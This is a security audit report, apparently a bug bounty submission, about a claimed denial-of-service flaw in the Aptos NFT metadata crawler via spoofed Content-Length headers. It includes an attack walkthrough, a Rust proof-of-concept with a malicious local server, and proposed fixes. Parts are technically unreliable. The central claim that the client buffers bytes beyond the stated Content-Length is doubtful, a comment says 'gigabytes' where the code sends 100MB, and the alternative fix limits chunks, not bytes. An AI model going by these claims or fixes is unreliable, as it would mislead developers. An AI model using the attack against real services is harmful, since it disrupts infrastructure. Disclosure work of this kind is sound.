# Audit Report

## Title
Content-Length Header Spoofing Enables Memory Exhaustion in NFT Metadata Crawler

## Summary
The NFT metadata crawler performs size validation using Content-Length headers from HTTP HEAD requests before downloading files, but does not re-validate the actual downloaded size. Malicious servers can report small Content-Length values (< 15MB) to bypass size checks, then stream gigabytes of data during GET requests, causing memory exhaustion and service crashes.

## Finding Description

The NFT metadata crawler implements a Time-of-Check Time-of-Use (TOCTOU) vulnerability combined with Content-Length header spoofing in two locations:

**1. Image Download Path:**

The `get_uri_metadata` function retrieves the Content-Length header via HEAD request: [1](#0-0) 

The `ImageOptimizer::optimize` function validates this size before downloading: [2](#0-1) 

However, the actual GET request downloads all data without size validation: [3](#0-2) 

The `response.bytes().await` call buffers the entire response body into memory regardless of the actual size. The reqwest library does not enforce that the actual response size matches the Content-Length header.

**2. JSON Download Path:**

The same vulnerability exists in JSON parsing: [4](#0-3) [5](#0-4) 

**Attack Flow:**
1. Attacker deploys NFT on Aptos blockchain with metadata URI pointing to malicious server
2. NFT metadata crawler processes this URI from blockchain events
3. Crawler sends HEAD request to attacker's server
4. Attacker responds with `Content-Length: 10000000` (10MB, under 15MB limit)
5. Size validation passes at lines cited above
6. Crawler sends GET request
7. Attacker's server sends `Content-Length: 10000000` header but streams 10GB of actual data
8. `response.bytes()` or `response.json()` attempts to buffer all 10GB into memory
9. Service exhausts memory and crashes (OOM) or becomes severely degraded
10. Attacker repeats with multiple malicious NFTs for sustained DoS

The vulnerability exists because:
- Size check occurs at "time of check" (HEAD request)
- Download occurs at "time of use" (GET request)
- No validation that actual downloaded bytes match the pre-checked Content-Length
- Reqwest library does not enforce Content-Length limits during response body consumption

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The crawler fails to enforce the configured `max_file_size_bytes` limit during actual downloads. [6](#0-5) 

## Impact Explanation

This qualifies as **High Severity** per Aptos bug bounty criteria: "API crashes."

The NFT metadata crawler exposes HTTP APIs and processes data from the blockchain. A successful attack causes:
- **Memory exhaustion** leading to Out-of-Memory (OOM) kills
- **Service crashes** requiring manual restart
- **Sustained denial of service** via multiple malicious NFTs
- **Resource exhaustion** affecting infrastructure hosting the service
- **Disruption of NFT metadata indexing** for the Aptos ecosystem

While this does not directly affect blockchain consensus or validator nodes, it targets critical ecosystem infrastructure that supports NFT functionality on Aptos. The vulnerability is exploitable by any unprivileged attacker who can deploy NFTs with malicious metadata URIs.

## Likelihood Explanation

**Likelihood: High**

- **Low Attack Complexity**: Attacker only needs to:
  1. Deploy NFT with malicious metadata URI (standard blockchain operation)
  2. Host HTTP server that returns spoofed Content-Length headers (trivial)
  3. No privileged access or insider knowledge required

- **High Impact/Low Cost Ratio**: Single malicious NFT can cause service crash with minimal resources

- **Repeatability**: Attack can be repeated indefinitely with new NFTs to maintain DoS

- **Detection Difficulty**: Malicious URIs appear legitimate until accessed, making blacklisting reactive rather than proactive

## Recommendation

**Implement size validation during actual download, not just during pre-check:**

```rust
// In image_optimizer.rs, replace lines 67-70:
let img_bytes = response
    .bytes()
    .await
    .context("Failed to load image bytes")?;

// With streaming validation:
use futures::StreamExt;
let mut img_bytes = Vec::new();
let mut stream = response.bytes_stream();
while let Some(chunk) = stream.next().await {
    let chunk = chunk.context("Failed to read image chunk")?;
    if img_bytes.len() + chunk.len() > max_file_size_bytes as usize {
        return Err(anyhow::anyhow!(
            "Image exceeds maximum size during download: {} bytes",
            max_file_size_bytes
        ));
    }
    img_bytes.extend_from_slice(&chunk);
}
```

Apply the same fix to `json_parser.rs` for JSON downloads. This enforces size limits incrementally during download, preventing memory exhaustion regardless of Content-Length header values.

**Alternative approach**: Use `reqwest::Response::content_length()` to validate the header, then use `take()` on the byte stream to limit consumption:

```rust
use futures::StreamExt;
use tokio::io::AsyncReadExt;

let content_length = response.content_length().unwrap_or(0);
if content_length > max_file_size_bytes as u64 {
    return Err(anyhow::anyhow!("Content-Length exceeds limit"));
}

let limited_stream = response.bytes_stream().take(max_file_size_bytes as usize);
let img_bytes = limited_stream.collect::<Result<Vec<_>, _>>().await?
    .into_iter().flatten().collect::<Vec<u8>>();
```

## Proof of Concept

```rust
// File: ecosystem/nft-metadata-crawler/tests/content_length_bypass_test.rs
#[cfg(test)]
mod tests {
    use tokio::net::TcpListener;
    use tokio::io::{AsyncWriteExt, AsyncReadExt};
    use std::time::Duration;
    
    #[tokio::test]
    async fn test_content_length_spoofing_bypass() {
        // Start malicious HTTP server
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        
        tokio::spawn(async move {
            let (mut socket, _) = listener.accept().await.unwrap();
            let mut buf = vec![0u8; 1024];
            let _n = socket.read(&mut buf).await.unwrap();
            
            // Check if HEAD request
            if buf.starts_with(b"HEAD") {
                // Respond with small Content-Length (10MB)
                let response = b"HTTP/1.1 200 OK\r\nContent-Length: 10000000\r\nContent-Type: image/jpeg\r\n\r\n";
                socket.write_all(response).await.unwrap();
            } else {
                // GET request - send headers claiming 10MB but stream gigabytes
                let headers = b"HTTP/1.1 200 OK\r\nContent-Length: 10000000\r\nContent-Type: image/jpeg\r\n\r\n";
                socket.write_all(headers).await.unwrap();
                
                // Stream 100MB of data (simulating gigabytes)
                let chunk = vec![0u8; 1024 * 1024]; // 1MB chunks
                for _ in 0..100 {
                    if socket.write_all(&chunk).await.is_err() {
                        break; // Client disconnected
                    }
                    tokio::time::sleep(Duration::from_millis(10)).await;
                }
            }
        });
        
        // Test the vulnerability
        use nft_metadata_crawler::utils::image_optimizer::ImageOptimizer;
        let uri = format!("http://{}/malicious.jpg", addr);
        
        // This should fail due to size limit but will attempt to download gigabytes
        let result = ImageOptimizer::optimize(
            &uri,
            15_000_000, // 15MB limit
            100,
            4096,
        ).await;
        
        // The service will consume massive memory before failing
        assert!(result.is_err());
    }
}
```

## Notes

This vulnerability demonstrates a classic TOCTOU (Time-of-Check Time-of-Use) pattern where validation occurs on metadata (HEAD response) separate from the actual data consumption (GET response). The HTTP protocol does not guarantee Content-Length header accuracy, and servers can send more data than advertised. The crawler must enforce limits during actual download, not just during pre-flight checks.

While the NFT metadata crawler is ecosystem infrastructure rather than a core consensus component, it is part of the official Aptos Core repository and its compromise affects the NFT user experience on Aptos. The vulnerability is distinct from network-level DoS (which is out of scope) because it exploits improper input validation at the application level.

### Citations

**File:** ecosystem/nft-metadata-crawler/src/lib.rs (L17-38)
```rust
pub async fn get_uri_metadata(url: &str) -> anyhow::Result<(String, u32)> {
    let client = Client::builder()
        .timeout(Duration::from_secs(MAX_HEAD_REQUEST_RETRY_SECONDS))
        .build()
        .context("Failed to build reqwest client")?;
    let request = client.head(url.trim());
    let response = request.send().await?;
    let headers = response.headers();

    let mime_type = headers
        .get(header::CONTENT_TYPE)
        .map(|value| value.to_str().unwrap_or("text/plain"))
        .unwrap_or("text/plain")
        .to_string();
    let size = headers
        .get(header::CONTENT_LENGTH)
        .and_then(|value| value.to_str().ok())
        .and_then(|s| s.parse::<u32>().ok())
        .unwrap_or(0);

    Ok((mime_type, size))
}
```

**File:** ecosystem/nft-metadata-crawler/src/utils/image_optimizer.rs (L41-50)
```rust
        let (_, size) = get_uri_metadata(uri).await?;
        if size > max_file_size_bytes {
            FAILED_TO_OPTIMIZE_IMAGE_COUNT
                .with_label_values(&["Image file too large"])
                .inc();
            return Err(anyhow::anyhow!(format!(
                "Image optimizer received file too large: {} bytes, skipping",
                size
            )));
        }
```

**File:** ecosystem/nft-metadata-crawler/src/utils/image_optimizer.rs (L61-70)
```rust
                let response = client
                    .get(uri.trim())
                    .send()
                    .await
                    .context("Failed to get image")?;

                let img_bytes = response
                    .bytes()
                    .await
                    .context("Failed to load image bytes")?;
```

**File:** ecosystem/nft-metadata-crawler/src/utils/json_parser.rs (L32-49)
```rust
        let (mime, size) = get_uri_metadata(&uri).await?;
        if ImageFormat::from_mime_type(&mime).is_some() {
            FAILED_TO_PARSE_JSON_COUNT
                .with_label_values(&["found image instead"])
                .inc();
            return Err(anyhow::anyhow!(format!(
                "JSON parser received image file: {}, skipping",
                mime
            )));
        } else if size > max_file_size_bytes {
            FAILED_TO_PARSE_JSON_COUNT
                .with_label_values(&["json file too large"])
                .inc();
            return Err(anyhow::anyhow!(format!(
                "JSON parser received file too large: {} bytes, skipping",
                size
            )));
        }
```

**File:** ecosystem/nft-metadata-crawler/src/utils/json_parser.rs (L60-69)
```rust
                let response = client
                    .get(uri.trim())
                    .send()
                    .await
                    .context("Failed to get JSON")?;

                let parsed_json = response
                    .json::<Value>()
                    .await
                    .context("Failed to parse JSON")?;
```

**File:** ecosystem/nft-metadata-crawler/src/utils/constants.rs (L22-23)
```rust
/// Default 15 MB maximum file size for files to be downloaded
pub const DEFAULT_MAX_FILE_SIZE_BYTES: u32 = 15_000_000;
```
